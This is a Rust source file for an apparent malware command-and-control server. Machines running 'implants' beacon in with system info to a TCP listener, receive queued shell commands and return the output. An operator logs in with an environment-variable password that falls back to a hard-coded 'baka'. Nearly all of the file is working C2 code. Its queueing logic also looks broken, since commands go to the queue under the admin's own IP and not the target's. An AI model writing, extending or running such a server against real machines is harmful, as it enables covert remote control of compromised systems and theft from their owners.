use std::{
    collections::HashMap,
    env,
    io::{Read, Write},
    net::{IpAddr, TcpListener, TcpStream},
    sync::{Arc, Mutex},
    thread,
    time::SystemTime,
};

use common::{IMPLANT_REPORT_RATE_SECONDS, Implant, MAX_PACKET_SIZE_BYTES, Packet, decode, encode};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let listener = TcpListener::bind("0.0.0.0:9120")?;
    let implants = Arc::new(Mutex::new(HashMap::new()));
    let admin_ip = Arc::new(Mutex::new(None));
    let command_queue = Arc::new(Mutex::new(HashMap::<IpAddr, Vec<String>>::new()));
    let results = Arc::new(Mutex::new(Vec::new()));

    for stream in listener.incoming() {
        let mut stream = stream.unwrap();

        let implants = Arc::clone(&implants);
        let admin_ip = Arc::clone(&admin_ip);
        let command_queue = Arc::clone(&command_queue);
        let results = Arc::clone(&results);

        thread::spawn(move || {
            let ip = stream.peer_addr().unwrap().ip();

            let mut buf = vec![0; MAX_PACKET_SIZE_BYTES];

            stream.read(&mut buf).expect("failed to read from stream");

            let decoded = decode(&buf).unwrap();

            match decoded {
                Packet::Beacon { system_info } => {
                    implants
                        .lock()
                        .unwrap()
                        .insert(ip, Implant::new(system_info));

                    stream
                        .write(
                            encode(Packet::CommandList {
                                commands: command_queue
                                    .lock()
                                    .unwrap()
                                    .get(&ip)
                                    .unwrap_or(&Vec::new())
                                    .clone(),
                            })
                            .unwrap()
                            .as_slice(),
                        )
                        .unwrap();
                    if let Some(commands) = command_queue.lock().unwrap().get_mut(&ip) {
                        commands.clear();
                    }
                }
                Packet::DashboardLogin { password } => {
                    let passwd = match env::var_os("TYSE_PASSWORD") {
                        Some(os_string) => os_string.into_string().unwrap_or("baka".to_string()),
                        None => "baka".to_string(),
                    };

                    if passwd == password {
                        stream
                            .write(encode(Packet::LoginSuccess).unwrap().as_slice())
                            .unwrap();

                        println!("{ip} logged in as admin");
                        *admin_ip.lock().unwrap() = Some(ip);
                    } else {
                        println!("{ip} failed to log in");
                        stream
                            .write(encode(Packet::LoginFailed).unwrap().as_slice())
                            .unwrap();
                    }
                }
                Packet::CommandResults {
                    results: result_list,
                } => {
                    for (output, exit_code) in result_list {
                        println!("({exit_code}) {output}");
                        results.lock().unwrap().push((output, exit_code));
                    }
                }
                _ => {
                    if let Some(admin_ip) = *admin_ip.lock().unwrap()
                        && stream.peer_addr().unwrap().ip() == admin_ip
                    {
                        let mut commands = command_queue.lock().unwrap();
                        if !commands.contains_key(&ip) {
                            commands.insert(ip, Vec::new());
                        }

                        if !results.lock().unwrap().is_empty() {
                            stream
                                .write(
                                    encode(Packet::CommandResults {
                                        results: results.lock().unwrap().clone(),
                                    })
                                    .unwrap()
                                    .as_slice(),
                                )
                                .unwrap();
                            results.lock().unwrap().clear();
                            stream.flush().unwrap();
                        }

                        run_admin_command(
                            &mut stream,
                            &decoded,
                            &mut implants.lock().unwrap(),
                            &mut commands.get_mut(&ip).unwrap(),
                        )
                        .unwrap();
                    } else {
                        println!(
                            "Unauthorized device tried to access admin commands: {}",
                            stream.peer_addr().unwrap().ip()
                        );
                    }
                }
            }
        });
    }

    Ok(())
}

fn run_admin_command(
    stream: &mut TcpStream,
    packet: &Packet,
    implants: &mut HashMap<IpAddr, Implant>,
    command_queue: &mut Vec<String>,
) -> Result<(), Box<dyn std::error::Error>> {
    match packet {
        Packet::ImplantListRequest => {
            println!("The admin requested the implant list: {implants:?}");
            // remove_old_implants(implants);

            stream.write(
                encode(Packet::ImplantList(
                    implants.values().map(|implant| implant.clone()).collect(),
                ))
                .unwrap()
                .as_slice(),
            )?;
        }
        Packet::Command {
            implant_id,
            command,
        } => {
            if let Some(_ip) = implants.keys().nth(*implant_id) {
                command_queue.push(command.clone());
            }
        }
        _ => {
            stream.write(encode(Packet::C2Alive).unwrap().as_slice())?;
        }
    }

    Ok(())
}

fn remove_old_implants(implants: &mut HashMap<IpAddr, Implant>) -> HashMap<IpAddr, Implant> {
    let now = SystemTime::now();

    implants
        .iter()
        .filter(|(_ip, implant)| {
            now.duration_since(implant.last_beacon_timestamp)
                .unwrap()
                .as_secs()
                < IMPLANT_REPORT_RATE_SECONDS.end + 60
        })
        .map(|(ip, implant)| (*ip, implant.clone()))
        .collect()
}
